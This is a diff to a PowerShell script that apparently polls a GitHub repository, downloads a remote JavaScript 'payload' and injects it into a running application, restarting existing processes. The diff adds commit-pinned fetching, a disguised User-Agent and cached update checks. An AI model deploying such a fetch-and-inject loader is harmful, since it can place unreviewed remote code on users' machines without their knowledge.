@@ -52,6 +52,7 @@ if (-not $MainPath) { $MainPath = Join-Path $Root 'main.js' }
 $AutoLaunch      = if ($null -ne $cfg.autoLaunch)      { [bool]$cfg.autoLaunch }      else { $true }
 $RestartExisting = if ($null -ne $cfg.restartExisting) { [bool]$cfg.restartExisting } else { $true }
 $PollSeconds     = if ($cfg.pollSeconds)               { [int]$cfg.pollSeconds }      else { 6 }
+$UpdateCheckSeconds = if ($cfg.updateCheckSeconds)     { [int]$cfg.updateCheckSeconds } else { 600 }
 
 function Get-RepoBase {
     if ($RepoBase) { return $RepoBase.TrimEnd('/') }
@@ -198,21 +199,63 @@ function Save-PayloadCache {
     } catch { Write-Log "Cache write failed: $($_.Exception.Message)" 'WARN' }
 }
 
-function Get-RemotePayload {
-    # returns @{ Code; Version; Url } or $null
-    if ($NoDownload) { return $null }
-    $url = $MainUrl
-    $version = $null
+function Get-GitHubCoord {
+    if ($RepoBase -and ($RepoBase -match 'raw\.githubusercontent\.com/([^/]+)/([^/]+)/([^/]+)')) {
+        return [pscustomobject]@{ Owner = $Matches[1]; Repo = $Matches[2]; Ref = $Matches[3] }
+    }
+    return $null
+}
 
+function Get-LatestSha {
+    $coord = Get-GitHubCoord
+    if (-not $coord) { return $null }
+    try {
+        $api = 'https://api.github.com/repos/{0}/{1}/commits/{2}?t={3}' -f $coord.Owner, $coord.Repo, $coord.Ref, [DateTime]::UtcNow.Ticks
+        $r = Invoke-RestMethod -Uri $api -TimeoutSec 10 -UseBasicParsing -Headers @{ 'User-Agent' = 'Python316' }
+        if ($r.sha) { return [string]$r.sha }
+    } catch { Write-Log "commit lookup failed: $($_.Exception.Message)" 'WARN' }
+    return $null
+}
+
+function Get-RemoteVersionJson {
+    # Prefer a commit-pinned URL (immutable, never CDN-stale), fall back to raw.
+    $coord = Get-GitHubCoord
+    $sha = Get-LatestSha
+    $urls = @()
+    if ($coord -and $sha) {
+        $urls += ('https://raw.githubusercontent.com/{0}/{1}/{2}/version.json' -f $coord.Owner, $coord.Repo, $sha)
+    }
     if ($RepoBase) {
+        $urls += ('{0}/version.json?t={1}' -f $RepoBase, [DateTime]::UtcNow.Ticks)
+    }
+    foreach ($u in $urls) {
         try {
-            $vUrl = '{0}/version.json?t={1}' -f $RepoBase, [DateTime]::UtcNow.Ticks
-            $v = Invoke-RestMethod -Uri $vUrl -TimeoutSec 10 -UseBasicParsing
-            if ($v.url) { $url = [string]$v.url }
-            if ($v.version) { $version = [string]$v.version }
-        } catch {
-            Write-Log "version.json unavailable: $($_.Exception.Message)" 'WARN'
-        }
+            $txt = (Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 15).Content
+            if ($txt -is [byte[]]) { $txt = [System.Text.Encoding]::UTF8.GetString($txt) }
+            $txt = ([string]$txt).TrimStart([char]0xFEFF)
+            $j = $txt | ConvertFrom-Json
+            if ($j.version) {
+                return [pscustomobject]@{ Version = [string]$j.version; Url = [string]$j.url; Sha = $sha; Coord = $coord }
+            }
+        } catch {}
+    }
+    return $null
+}
+
+function Get-RemotePayload {
+    if ($NoDownload) { return $null }
+    $meta = Get-RemoteVersionJson
+    $version = if ($meta) { $meta.Version } else { $null }
+    $coord = if ($meta) { $meta.Coord } else { Get-GitHubCoord }
+    $sha = if ($meta) { $meta.Sha } else { $null }
+
+    $url = $null
+    if ($coord -and $sha) {
+        $url = 'https://raw.githubusercontent.com/{0}/{1}/{2}/main.js' -f $coord.Owner, $coord.Repo, $sha
+    } elseif ($meta -and $meta.Url) {
+        $url = $meta.Url
+    } elseif ($MainUrl) {
+        $url = $MainUrl
     }
     if (-not $url) { Write-Log 'No payload URL resolved' 'WARN'; return $null }
 
@@ -220,17 +263,18 @@ function Get-RemotePayload {
         $sep = if ($url -match '\?') { '&' } else { '?' }
         $fUrl = '{0}{1}t={2}' -f $url, $sep, [DateTime]::UtcNow.Ticks
         $code = (Invoke-WebRequest -Uri $fUrl -UseBasicParsing -TimeoutSec 20).Content
+        if ($code -is [byte[]]) { $code = [System.Text.Encoding]::UTF8.GetString($code) }
         if (-not (Test-PayloadCode -Code $code)) { throw 'payload failed validation' }
         if ($version) {
             if ($code -match '__version\s*=\s*[''"]([^''"]+)[''"]') {
                 $codeVer = $Matches[1]
-                if ($codeVer -ne $version) {
-                    throw "payload version mismatch (declared=$version got=$codeVer, stale CDN?)"
-                }
+                if ($codeVer -ne $version) { throw "payload version mismatch (declared=$version got=$codeVer)" }
                 $version = $codeVer
             } else {
-                throw "payload missing version marker (declared=$version, stale CDN?)"
+                throw "payload missing version marker (declared=$version)"
             }
+        } else {
+            if ($code -match '__version\s*=\s*[''"]([^''"]+)[''"]') { $version = $Matches[1] }
         }
         Save-PayloadCache -Code $code
         return [pscustomobject]@{ Code = $code; Version = $version; Url = $url }
@@ -283,6 +327,8 @@ function Save-InjectState {
 
 $script:FailBackoff = 0
 $script:LastOkVersion = $null
+$script:CachedPayload = $null
+$script:LastCheck = 0
 
 # ---------------------------------------------------------------- one pass
 function Invoke-Pass {
@@ -316,7 +362,13 @@ function Invoke-Pass {
     }
 
     try {
-        $payload = Get-Payload
+        $epoch = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
+        if ((-not $script:CachedPayload) -or (($epoch - $script:LastCheck) -ge $UpdateCheckSeconds)) {
+            $script:CachedPayload = Get-Payload
+            $script:LastCheck = $epoch
+        }
+        $payload = $script:CachedPayload
+        if (-not $payload) { throw 'No payload available' }
         $current = Get-CurrentVersion
 
         if (Test-VersionMatch -Current $current -Desired $payload.Version) {
